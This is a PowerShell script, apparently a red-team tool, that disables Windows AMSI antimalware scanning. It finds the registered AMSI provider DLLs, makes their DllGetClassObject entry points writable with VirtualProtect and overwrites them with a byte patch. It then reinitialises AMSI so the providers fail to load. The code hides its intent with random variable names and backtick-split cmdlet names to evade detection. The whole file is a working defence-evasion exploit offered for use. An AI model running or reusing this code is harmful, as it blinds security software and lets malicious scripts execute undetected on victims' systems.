# Write-Host "AMSI providers' initialization interception"
# Write-Host "-- Maor Korkos (@maorkor)"

# Call Windows APIs with reflection (crediton reflection: http://redteam.cafe/red-team/powershell/using-reflection-for-amsi-bypass)
# Add-Type causes the code to be written to a temporary file on the disk, then csc.exe is used to compile this code into a binary
# Artifacts on disk may cause AV detection, solution - reflection

# Providers registry enumeration implemented by: https://github.com/R-Secure/AMSI-Bypasses

function Get-ProcAddress {
    Param(
        [Parameter(Position = 0, Mandatory = $True)] [String] $DropZip,
        [Parameter(Position = 1, Mandatory = $True)] [String] $LateVersed
    )

    # Get a reference to System.dll in the GAC
    $UncleRefuse = [AppDomain]::CurrentDomain.GetAssemblies() |
    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
    $PushyGodly = $UncleRefuse.GetType('Microsoft.Win32.UnsafeNativeMethods')
    # Get a reference to the GetModuleHandle and GetProcAddress methods
    $KeyListen = $PushyGodly.GetMethod('GetModuleHandle')
    $MilkSongs = $PushyGodly.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String]))
    # Get a handle to the module specified
    $SkyHurry = $KeyListen.Invoke($null, @($DropZip))
    $HauntBasin = ne`w-ob`je`ct IntPtr
    $SameObject = ne`w-ob`je`ct System.Runtime.InteropServices.HandleRef($HauntBasin, $SkyHurry)
    # Return the address of the function
    return $MilkSongs.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$SameObject, $LateVersed))
}
function Get-DelegateType
{
    Param
    (
        [OutputType([Type])]
            
        [Parameter( Position = 0)]
        [Type[]]
        $SleepSwing = (ne`w-ob`je`ct Type[](0)),
            
        [Parameter( Position = 1 )]
        [Type]
        $IceAvoid = [Void]
    )

    $DependAttend = [AppDomain]::CurrentDomain
    $MinePinch = ne`w-ob`je`ct System.Reflection.AssemblyName('ReflectedDelegate')
    $FoundMeat = $DependAttend.DefineDynamicAssembly($MinePinch, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
    $BeadMaid = $FoundMeat.DefineDynamicModule('InMemoryModule', $false)
    $PlayLevel = $BeadMaid.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
    $GrowthSki = $PlayLevel.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $SleepSwing)
    $GrowthSki.SetImplementationFlags('Runtime, Managed')
    $LaughTrap = $PlayLevel.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $IceAvoid, $SleepSwing)
    $LaughTrap.SetImplementationFlags('Runtime, Managed')
        
    Write-Output $PlayLevel.CreateType()
}
$SodaLumpy = Get-ProcAddress kernel32.dll LoadLibraryA
$DapperTall = Get-DelegateType @([String]) ([IntPtr])
$ShiverTax = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($SodaLumpy,
$DapperTall)
$FourRhythm = Get-ProcAddress kernel32.dll GetProcAddress
$NearPin = Get-DelegateType @([IntPtr], [String]) ([IntPtr])
$MilkSongs = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($FourRhythm,
$NearPin)
$ManyLumber = Get-ProcAddress kernel32.dll VirtualProtect
$ManageSignal = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
$FlimsyAttach = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ManyLumber,
$ManageSignal)

$WaxSnow = [Byte[]] (0x31, 0xC0, 0x05, 0x78, 0x01, 0x19, 0x7F, 0x05, 0xDF, 0xFE, 0xED, 0x00, 0xC3)
$SpellPaint = 0

foreach ($MistyMouth in Get-ChildItem  HKLM:\SOFTWARE\Microsoft\AMSI\Providers -Name)
{
    $ReasonFry = 'HKLM:\Software\Classes\CLSID\' + $MistyMouth + '\InprocServer32'
    $RottenCannon = Get-ItemPropertyValue -Name '(Default)' $ReasonFry -ErrorAction SilentlyContinue
    if ($RottenCannon)
    {
        $FlightFound = Split-Path $RottenCannon -leaf
        $TestedPurple = $FlightFound -replace '"', ""
        $NationToy = $ShiverTax.Invoke($TestedPurple) 
        if ($NationToy -ne 0)
        {
            Write-host "[*] Provider found - " $FlightFound
            $RangeReach = $MilkSongs.Invoke($NationToy, "DllGetClassObject")        
            $FlimsyAttach.Invoke($RangeReach, [uint32]$WaxSnow.Length, 0x40, [ref]$SpellPaint)
            [System.Runtime.InteropServices.Marshal]::Copy($WaxSnow, 0, $RangeReach, $WaxSnow.Length)
        }
    }
}

$object = [Ref].Assembly.GetType('System.Management.Automation.Ams'+'iUtils')
$GateChalk = $object.GetMethods("NonPublic,static") | Where-Object Name -eq Uninitialize
$GateChalk.Invoke($object,$null)
